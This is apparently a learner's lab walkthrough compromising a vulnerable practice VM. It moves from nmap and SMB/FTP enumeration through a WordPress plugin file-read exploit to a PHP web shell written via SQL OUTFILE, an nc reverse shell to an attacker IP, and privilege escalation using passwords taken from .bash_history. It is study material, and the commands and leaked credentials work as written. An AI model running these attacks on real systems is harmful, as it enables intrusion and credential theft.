@@ -1,0 +1,138 @@
+sudo nmap -sVC -p- -v -T4 -sT --open 192.168.187.148 
+21/tcp    open  ftp         vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http        PHP cli server 5.5 or later
+|_http-title: 404 Not Found
+139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
+666/tcp   open  tcpwrapped
+3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
+12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+Because ping 192.168.187.148 fail, research and learn that this indicated Target Blocking ICMP Requests.
+run below nmap again. adding the -Pn flag skip host-dicovery.
+sudo nmap -Pn -n -v -sS -T4 -p- 192.168.187.148 
+found more info for port 666.
+666/tcp   open  pkzip-file  .ZIP file
+| fingerprint-strings: 
+|   NULL: 
+|     message2.jpgUT 
+
+saw this linux machine have port 139 NetBios open, with smb version. run enum4linux to ennumerate.
+
+enum4linux 192.168.187.148
+Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        kathy           Disk      Fred, What are we doing here?
+        tmp             Disk      All temporary files should be stored here
+        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            RED
+//192.168.187.148/kathy Mapping: OK Listing: OK Writing: N/A
+//192.168.187.148/tmp   Mapping: OK Listing: OK Writing: N/A
+
+use smbclient to ennumerate.
+$ smbclient //192.168.187.148/kathy 
+Password for [WORKGROUP\alan]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jun  4 00:52:52 2016
+  ..                                  D        0  Tue Jun  7 05:39:56 2016
+  kathy_stuff                         D        0  Sun Jun  5 23:02:27 2016
+  backup                              D        0  Sun Jun  5 23:04:14 2016
+
+                19478204 blocks of size 1024. 16126764 blocks available
+smb: \> prompt off
+smb: \> recurse on
+smb: \> mget *
+getting file \kathy_stuff\todo-list.txt of size 64 as kathy_stuff/todo-list.txt (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
+getting file \backup\vsftpd.conf of size 5961 as backup/vsftpd.conf (291.1 KiloBytes/sec) (average 143.5 KiloBytes/sec)
+getting file \backup\wordpress-4.tar.gz of size 6321767 as backup/wordpress-4.tar.gz (13391.8 KiloBytes/sec) (average 12309.7 KiloBytes/sec)
+
+saw port 21 ftp open with allow anonymous.
+ftp 192.168.187.148
+get a file note
+
+run gobuster receiving a 400 Bad Request code. We could be receiving this error 
+because it’s expecting HTTPS instead of HTTP.
+
+access in https://192.168.187.148:12380/
+review robots.txt
+found /blogblog/ and /admin112233/
+and in /blogblog/ found it is run on WordPress.
+run nikto, found /phpmyadmin/ 
+$ wpscan --url https://192.168.187.148:12380/blogblog/ --plugins-detection aggressive --disable-tls-checks
+By default, wpscan is "passive"—it just looks at the HTML source code of the homepage for clues.
+Aggressive mode actively brutes-forces the names of thousands of known plugins by trying to access their specific directories
+--disable-tls-checks ignore SSL/TLS certificate errors when the target is running on HTTPS
+
+Found [+] advanced-video-embed-embed-videos-or-playlists
+ | Location: https://192.168.187.148:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
+ | Latest Version: 1.0 (up to date)
+
+searchsploit WordPress Advanced Video, learnt that original exploit.py have issue.
+go github to find the exploit for WordPress Advanced Video v1.0
+https://github.com/gtech/39646/blob/master/39646.py
+
+Found in output:
+You can get this info from your web host ** //\n/** The name of the database for 
+WordPress */\ndefine(\'DB_NAME\', \'wordpress\');\n\n/** MySQL database username */\n
+define(\'DB_USER\', \'root\');\n\n/** MySQL database password */\n
+define(\'DB_PASSWORD\', \'plbkac\');\n\n/** MySQL hostname */\n
+define(\'DB_HOST\', \'localhost\');\n\n/** Database Charset to use in creating database 
+tables. */\ndefine(\'DB_CHARSET\', \'utf8mb4\');
+
+go to phpmyadmin page, login with root:plbkac
+access in MySQL database. 
+SELECT * FROM `wp_users`
+find users with pass hash $P$B
+hashcat -m 400 <hash> 
+John incorrect. # but fail to ssh in with this john and root credentials.
+
+use below tactics to curl an non-existing file. Intentionally triggering errors is a useful 
+technique for revealing internal system details. In this case, it allowed us to identify 
+the WordPress installation path: /var/www/https/blogblog.
+curl 'https://192.168.187.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/aw0ken.txt' -k
+<br /><b>Warning</b>:  file_get_contents(/aw0ken.txt): failed to open stream: 
+No such file or directory in <b>/var/www/https/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/inc/classes/class.avePost.php</b> on line <b>78</b><br />
+https://192.168.187.148:12380/blogblog/?p=230
+
+In wordpress databases. run below sql to make a command injection field.
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/web-shell.php';
+Then run curl to confirm that the cmd field is set successfully.
+$ curl 'https://192.168.187.148:12380/blogblog/wp-content/uploads/web-shell.php?c=id' -k
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+nc -nlvp 4444
+curl -k 'https://192.168.187.148:12380/blogblog/wp-content/uploads/web-shell.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.161%204444%20%3E%2Ftmp%2Ff'
+
+in reverse shell.
+ls -la /home. found that have read permission for other all users
+run below find cmd to list all .bash_history for all users.
+find /home -type f -name .bash_history -exec cat {} \; 2>/dev/null
+found 2 credentials 
+sshpass -p thisimypassword ssh JKanode@localhost
+sshpass -p JZQuyIN5 ssh peter@localhost
+use id peter to confirm that user peter have sudo privilege.
+
+sudo -l
+User peter may run the following commands on red:
+    (ALL : ALL) ALL
+
+then run sudo su. to get a root shell
+
+
+
